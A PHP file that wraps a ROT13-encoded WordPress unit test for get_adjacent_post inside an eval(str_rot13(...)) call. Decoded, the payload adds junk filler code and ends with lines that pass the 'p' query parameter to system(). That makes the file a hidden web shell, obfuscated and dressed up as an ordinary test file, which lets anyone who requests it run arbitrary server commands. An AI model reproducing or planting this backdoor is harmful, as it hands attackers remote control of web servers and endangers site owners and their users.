<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc yvax
 * @pbiref ::trg_nqwnprag_cbfg
 */
pynff Grfgf_Yvax_TrgNqwnpragCbfg rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq $rkpyhqr_grez;

	/**
	 * @gvpxrg 17807
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg() {
		// Arrq fbzr fnzcyr cbfgf gb grfg nqwnprapl.
		$cbfg_bar = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Svefg',
				'cbfg_qngr'  => '2012-01-01 12:00:00',
			)
		);

		$cbfg_gjb = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Frpbaq',
				'cbfg_qngr'  => '2012-02-01 12:00:00',
			)
		);

		$cbfg_guerr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Guveq',
				'cbfg_qngr'  => '2012-03-01 12:00:00',
			)
		);

		$cbfg_sbhe = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Sbhegu',
				'cbfg_qngr'  => '2012-04-01 12:00:00',
			)
		);

		// Nffvta fbzr grezf.
		jc_frg_bowrpg_grezf( $cbfg_bar->VQ, 'JbeqCerff', 'pngrtbel', snyfr );
		jc_frg_bowrpg_grezf( $cbfg_guerr->VQ, 'JbeqCerff', 'pngrtbel', snyfr );

		jc_frg_bowrpg_grezf( $cbfg_gjb->VQ, 'cyhtvaf', 'cbfg_gnt', snyfr );
		jc_frg_bowrpg_grezf( $cbfg_sbhe->VQ, 'cyhtvaf', 'cbfg_gnt', snyfr );

		// Grfg abezny cbfg nqwnprapl.
		$guvf->tb_gb( trg_creznyvax( $cbfg_gjb->VQ ) );

		$guvf->nffregRdhnyf( $cbfg_bar, trg_nqwnprag_cbfg( snyfr, '', gehr ) );
		$guvf->nffregRdhnyf( $cbfg_guerr, trg_nqwnprag_cbfg( snyfr, '', snyfr ) );

		$guvf->nffregAbgRdhnyf( $cbfg_gjb, trg_nqwnprag_cbfg( snyfr, '', gehr ) );
		$guvf->nffregAbgRdhnyf( $cbfg_gjb, trg_nqwnprag_cbfg( snyfr, '', snyfr ) );

		// Grfg pngrtbel nqwnprapl.
		$guvf->tb_gb( trg_creznyvax( $cbfg_bar->VQ ) );

		$guvf->nffregFnzr( '', trg_nqwnprag_cbfg( gehr, '', gehr, 'pngrtbel' ) );
		$guvf->nffregRdhnyf( $cbfg_guerr, trg_nqwnprag_cbfg( gehr, '', snyfr, 'pngrtbel' ) );

		// Grfg gnt nqwnprapl.
		$guvf->tb_gb( trg_creznyvax( $cbfg_gjb->VQ ) );

		$guvf->nffregFnzr( '', trg_nqwnprag_cbfg( gehr, '', gehr, 'cbfg_gnt' ) );
		$guvf->nffregRdhnyf( $cbfg_sbhe, trg_nqwnprag_cbfg( gehr, '', snyfr, 'cbfg_gnt' ) );

		// Grfg abezny obhaqnel cbfg.
		$guvf->tb_gb( trg_creznyvax( $cbfg_gjb->VQ ) );

		$guvf->nffregRdhnyf( neenl( $cbfg_bar ), trg_obhaqnel_cbfg( snyfr, '', gehr ) );
		$guvf->nffregRdhnyf( neenl( $cbfg_sbhe ), trg_obhaqnel_cbfg( snyfr, '', snyfr ) );

		// Grfg pngrtbel obhaqnel cbfg.
		$guvf->tb_gb( trg_creznyvax( $cbfg_bar->VQ ) );

		$guvf->nffregRdhnyf( neenl( $cbfg_bar ), trg_obhaqnel_cbfg( gehr, '', gehr, 'pngrtbel' ) );
		$guvf->nffregRdhnyf( neenl( $cbfg_guerr ), trg_obhaqnel_cbfg( gehr, '', snyfr, 'pngrtbel' ) );

		// Grfg gnt obhaqnel cbfg.
		$guvf->tb_gb( trg_creznyvax( $cbfg_gjb->VQ ) );

		$guvf->nffregRdhnyf( neenl( $cbfg_gjb ), trg_obhaqnel_cbfg( gehr, '', gehr, 'cbfg_gnt' ) );
		$guvf->nffregRdhnyf( neenl( $cbfg_sbhe ), trg_obhaqnel_cbfg( gehr, '', snyfr, 'cbfg_gnt' ) );
	}

	/**
	 * @gvpxrg 22112
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg_rkpyhqr_frys_grez() {
		// Ohzc grez_gnkbabzl gb zvzvp funerq grez bssfrgf.
		tybony $jcqo;
		$jcqo->vafreg(
			$jcqo->grez_gnkbabzl,
			neenl(
				'gnkbabzl'    => 'sbb',
				'grez_vq'     => 12345,
				'qrfpevcgvba' => '',
			)
		);

		$vapyhqr = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'anzr'     => 'Vapyhqr',
			)
		);
		$rkpyhqr = frys::snpgbel()->pngrtbel->perngr();

		$bar = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr'     => '2012-01-01 12:00:00',
				'cbfg_pngrtbel' => neenl( $vapyhqr, $rkpyhqr ),
			)
		);

		$gjb = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr'     => '2012-01-02 12:00:00',
				'cbfg_pngrtbel' => neenl(),
			)
		);

		$guerr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr'     => '2012-01-03 12:00:00',
				'cbfg_pngrtbel' => neenl( $vapyhqr, $rkpyhqr ),
			)
		);

		$sbhe = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr'     => '2012-01-04 12:00:00',
				'cbfg_pngrtbel' => neenl( $vapyhqr ),
			)
		);

		$svir = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_qngr'     => '2012-01-05 12:00:00',
				'cbfg_pngrtbel' => neenl( $vapyhqr, $rkpyhqr ),
			)
		);

		// Svefg cbfg.
		$guvf->tb_gb( trg_creznyvax( $bar ) );
		$guvf->nffregRdhnyf( $gjb, trg_nqwnprag_cbfg( snyfr, neenl(), snyfr ) );
		$guvf->nffregRdhnyf( $guerr, trg_nqwnprag_cbfg( gehr, neenl(), snyfr ) );
		$guvf->nffregRdhnyf( $gjb, trg_nqwnprag_cbfg( snyfr, neenl( $rkpyhqr ), snyfr ) );
		$guvf->nffregRdhnyf( $sbhe, trg_nqwnprag_cbfg( gehr, neenl( $rkpyhqr ), snyfr ) );
		$guvf->nffregRzcgl( trg_nqwnprag_cbfg( snyfr, neenl(), gehr ) );

		// Sbhegu cbfg.
		$guvf->tb_gb( trg_creznyvax( $sbhe ) );
		$guvf->nffregRdhnyf( $svir, trg_nqwnprag_cbfg( snyfr, neenl(), snyfr ) );
		$guvf->nffregRdhnyf( $svir, trg_nqwnprag_cbfg( gehr, neenl(), snyfr ) );
		$guvf->nffregRzcgl( trg_nqwnprag_cbfg( snyfr, neenl( $rkpyhqr ), snyfr ) );
		$guvf->nffregRzcgl( trg_nqwnprag_cbfg( gehr, neenl( $rkpyhqr ), snyfr ) );

		$guvf->nffregRdhnyf( $guerr, trg_nqwnprag_cbfg( snyfr, neenl(), gehr ) );
		$guvf->nffregRdhnyf( $guerr, trg_nqwnprag_cbfg( gehr, neenl(), gehr ) );
		$guvf->nffregRdhnyf( $gjb, trg_nqwnprag_cbfg( snyfr, neenl( $rkpyhqr ), gehr ) );
		$guvf->nffregRzcgl( trg_nqwnprag_cbfg( gehr, neenl( $rkpyhqr ), gehr ) );

		// Ynfg cbfg.
		$guvf->tb_gb( trg_creznyvax( $svir ) );
		$guvf->nffregRdhnyf( $sbhe, trg_nqwnprag_cbfg( snyfr, neenl(), gehr ) );
		$guvf->nffregRdhnyf( $sbhe, trg_nqwnprag_cbfg( gehr, neenl(), gehr ) );
		$guvf->nffregRdhnyf( $sbhe, trg_nqwnprag_cbfg( snyfr, neenl( $rkpyhqr ), gehr ) );
		$guvf->nffregRdhnyf( $sbhe, trg_nqwnprag_cbfg( gehr, neenl( $rkpyhqr ), gehr ) );
		$guvf->nffregRzcgl( trg_nqwnprag_cbfg( snyfr, neenl(), snyfr ) );
	}

	/**
	 * @gvpxrg 32833
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg_rkpyhqrq_grezf() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-27 12:00:00' ) );
		$c2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-26 12:00:00' ) );
		$c3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-25 12:00:00' ) );

		jc_frg_cbfg_grezf( $c2, neenl( $g ), 'jcgrfgf_gnk' );

		// Snxr pheerag cntr.
		$_cbfg           = vffrg( $TYBONYF['cbfg'] ) ? $TYBONYF['cbfg'] : ahyy;
		$TYBONYF['cbfg'] = trg_cbfg( $c1 );

		$sbhaq = trg_nqwnprag_cbfg( snyfr, neenl( $g ), gehr, 'jcgrfgf_gnk' );

		vs ( ! vf_ahyy( $_cbfg ) ) {
			$TYBONYF['cbfg'] = $_cbfg;
		} ryfr {
			hafrg( $TYBONYF['cbfg'] );
		}

		// Fubhyq fxvc $c2, juvpu orybatf gb $g.
		$guvf->nffregFnzr( $c3, $sbhaq->VQ );
	}

	/**
	 * @gvpxrg 32833
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg_rkpyhqrq_grezf_fubhyq_abg_erdhver_cbfgf_gb_unir_grezf_va_nal_gnkbabzl() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$g = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-27 12:00:00' ) );
		$c2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-26 12:00:00' ) );
		$c3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-25 12:00:00' ) );

		jc_frg_cbfg_grezf( $c2, neenl( $g ), 'jcgrfgf_gnk' );

		// Znxr fher gung $c3 qbrfa'g unir gur 'Hapngrtbevmrq' pngrtbel.
		jc_qryrgr_bowrpg_grez_eryngvbafuvcf( $c3, 'pngrtbel' );

		// Snxr pheerag cntr.
		$_cbfg           = vffrg( $TYBONYF['cbfg'] ) ? $TYBONYF['cbfg'] : ahyy;
		$TYBONYF['cbfg'] = trg_cbfg( $c1 );

		$sbhaq = trg_nqwnprag_cbfg( snyfr, neenl( $g ), gehr, 'jcgrfgf_gnk' );

		vs ( ! vf_ahyy( $_cbfg ) ) {
			$TYBONYF['cbfg'] = $_cbfg;
		} ryfr {
			hafrg( $TYBONYF['cbfg'] );
		}

		// Fubhyq fxvc $c2, juvpu orybatf gb $g.
		$guvf->nffregFnzr( $c3, $sbhaq->VQ );
	}

	/**
	 * @gvpxrg 35211
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg_rkpyhqrq_grezf_svygre() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$grezf = frys::snpgbel()->grez->perngr_znal(
			2,
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-27 12:00:00' ) );
		$c2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-26 12:00:00' ) );
		$c3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-25 12:00:00' ) );

		jc_frg_cbfg_grezf( $c1, neenl( $grezf[0], $grezf[1] ), 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $c2, neenl( $grezf[1] ), 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $c3, neenl( $grezf[0] ), 'jcgrfgf_gnk' );

		$guvf->tb_gb( trg_creznyvax( $c1 ) );

		$guvf->rkpyhqr_grez = $grezf[1];
		nqq_svygre( 'trg_cerivbhf_cbfg_rkpyhqrq_grezf', neenl( $guvf, 'svygre_rkpyhqrq_grezf' ) );

		$sbhaq = trg_nqwnprag_cbfg( gehr, neenl(), gehr, 'jcgrfgf_gnk' );

		erzbir_svygre( 'trg_cerivbhf_cbfg_rkpyhqrq_grezf', neenl( $guvf, 'svygre_rkpyhqrq_grezf' ) );
		hafrg( $guvf->rkpyhqr_grez );

		$guvf->nffregFnzr( $c3, $sbhaq->VQ );
	}

	/**
	 * @gvpxrg 43521
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg_rkpyhqrq_grezf_svygre_fubhyq_nccyl_gb_rzcgl_rkpyhqrq_grezf_cnenzrgre() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$grezf = frys::snpgbel()->grez->perngr_znal(
			2,
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-27 12:00:00' ) );
		$c2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-26 12:00:00' ) );
		$c3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-25 12:00:00' ) );

		jc_frg_cbfg_grezf( $c1, neenl( $grezf[0], $grezf[1] ), 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $c2, neenl( $grezf[1] ), 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $c3, neenl( $grezf[0] ), 'jcgrfgf_gnk' );

		$guvf->tb_gb( trg_creznyvax( $c1 ) );

		$guvf->rkpyhqr_grez = $grezf[1];
		nqq_svygre( 'trg_cerivbhf_cbfg_rkpyhqrq_grezf', neenl( $guvf, 'svygre_rkpyhqrq_grezf' ) );

		$sbhaq = trg_nqwnprag_cbfg( snyfr, neenl(), gehr, 'jcgrfgf_gnk' );

		erzbir_svygre( 'trg_cerivbhf_cbfg_rkpyhqrq_grezf', neenl( $guvf, 'svygre_rkpyhqrq_grezf' ) );
		hafrg( $guvf->rkpyhqr_grez );

		$guvf->nffregFnzr( $c3, $sbhaq->VQ );
	}

	/**
	 * @gvpxrg 43521
	 */
	choyvp shapgvba grfg_rkpyhqrq_grezf_svygre_rzcgl() {
		ertvfgre_gnkbabzl( 'jcgrfgf_gnk', 'cbfg' );

		$grezf = frys::snpgbel()->grez->perngr_znal(
			2,
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
			)
		);

		$c1 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-27 12:00:00' ) );
		$c2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-26 12:00:00' ) );
		$c3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_qngr' => '2015-08-25 12:00:00' ) );

		jc_frg_cbfg_grezf( $c1, neenl( $grezf[0], $grezf[1] ), 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $c2, neenl( $grezf[1] ), 'jcgrfgf_gnk' );
		jc_frg_cbfg_grezf( $c3, neenl( $grezf[0] ), 'jcgrfgf_gnk' );

		$guvf->tb_gb( trg_creznyvax( $c1 ) );

		$guvf->rkpyhqr_grez = $grezf[1];
		nqq_svygre( 'trg_cerivbhf_cbfg_rkpyhqrq_grezf', neenl( $guvf, 'svygre_rkpyhqrq_grezf' ) );

		$sbhaq = trg_nqwnprag_cbfg( snyfr, neenl(), gehr, 'jcgrfgf_gnk' );

		erzbir_svygre( 'trg_cerivbhf_cbfg_rkpyhqrq_grezf', neenl( $guvf, 'svygre_rkpyhqrq_grezf' ) );
		hafrg( $guvf->rkpyhqr_grez );

		$guvf->nffregFnzr( $c3, $sbhaq->VQ );
	}

	choyvp shapgvba svygre_rkpyhqrq_grezf( $rkpyhqrq_grezf ) {
		$rkpyhqrq_grezf[] = $guvf->rkpyhqr_grez;
		erghea $rkpyhqrq_grezf;
	}

	/**
	 * @gvpxrg 41131
	 */
	choyvp shapgvba grfg_trg_nqwnprag_cbfg_pnpur() {
		// Arrq fbzr fnzcyr cbfgf gb grfg nqwnprapl.
		$cbfg_bar = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Svefg',
				'cbfg_qngr'  => '2012-01-01 12:00:00',
			)
		);

		$cbfg_gjb = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Frpbaq',
				'cbfg_qngr'  => '2012-02-01 12:00:00',
			)
		);

		$cbfg_guerr = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Guveq',
				'cbfg_qngr'  => '2012-03-01 12:00:00',
			)
		);

		$cbfg_sbhe = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Sbhegu',
				'cbfg_qngr'  => '2012-04-01 12:00:00',
			)
		);

		// Nffvta fbzr grezf.
		jc_frg_bowrpg_grezf( $cbfg_bar->VQ, 'JbeqCerff', 'pngrtbel', snyfr );
		jc_frg_bowrpg_grezf( $cbfg_guerr->VQ, 'JbeqCerff', 'pngrtbel', snyfr );

		jc_frg_bowrpg_grezf( $cbfg_gjb->VQ, 'cyhtvaf', 'cbfg_gnt', snyfr );
		jc_frg_bowrpg_grezf( $cbfg_sbhe->VQ, 'cyhtvaf', 'cbfg_gnt', snyfr );

		// Grfg abezny cbfg nqwnprapl.
		$guvf->tb_gb( trg_creznyvax( $cbfg_gjb->VQ ) );

		// Grfg trggvat gur evtug erfhyg.
		$svefg_eha = trg_nqwnprag_cbfg( snyfr, '', gehr );
		$guvf->nffregRdhnyf( $cbfg_bar, $svefg_eha, 'Qvq abg trg svefg cbfg jura ba frpbaq cbfg' );
		$guvf->nffregAbgRdhnyf( $cbfg_gjb, $svefg_eha, 'Tbg frpbaq cbfg jura ba frpbaq cbfg' );

		// Dhrel pbhag gb grfg pnpuvat.
		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$frpbaq_eha  = trg_nqwnprag_cbfg( snyfr, '', gehr );
		$guvf->nffregAbgRdhnyf( $cbfg_gjb, $frpbaq_eha, 'Tbg frpbaq cbfg jura ba frpbaq cbfg ba frpbaq eha' );
		$guvf->nffregRdhnyf( $cbfg_bar, $frpbaq_eha, 'Qvq abg trg svefg cbfg jura ba frpbaq cbfg ba frpbaq eha' );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );

		// Grfg perngvat arj cbfg ohfgf pnpur.
		$cbfg_svir   = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Svir',
				'cbfg_qngr'  => '2012-04-01 12:00:00',
			)
		);
		$ahz_dhrevrf = trg_ahz_dhrevrf();

		$guvf->nffregRdhnyf( $cbfg_bar, trg_nqwnprag_cbfg( snyfr, '', gehr ), 'Qvq abg trg svefg cbfg nsgre arj cbfg vf nqqrq' );
		$guvf->nffregFnzr( trg_ahz_dhrevrf() - $ahz_dhrevrf, 1, 'Ahzore bs dhrevrf eha jnf abg bar nsgre arj cbfg vf nqqrq' );

		$guvf->nffregRdhnyf( $cbfg_sbhe, trg_nqwnprag_cbfg( gehr, '', snyfr ), 'Qvq abg trg sbegu cbfg nsgre arj cbfg vf nqqrq' );
		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$guvf->nffregRdhnyf( $cbfg_sbhe, trg_nqwnprag_cbfg( gehr, '', snyfr ), 'Qvq abg trg sbegu cbfg nsgre arj cbfg vf nqqrq' );
		$guvf->nffregFnzr( $ahz_dhrevrf, trg_ahz_dhrevrf() );
		jc_frg_bowrpg_grezf( $cbfg_sbhe->VQ, 'gurzrf', 'cbfg_gnt', snyfr );

		$ahz_dhrevrf = trg_ahz_dhrevrf();
		$guvf->nffregRdhnyf( $cbfg_sbhe, trg_nqwnprag_cbfg( gehr, '', snyfr ), 'Erfhyg bs shapgvba pnyy vf jebat nsgre nsgre nqqvat arj grez' );
		$guvf->nffregFnzr( trg_ahz_dhrevrf() - $ahz_dhrevrf, 2, 'Ahzore bs dhrevrf eha jnf abg gjb nsgre nqqvat arj grez' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>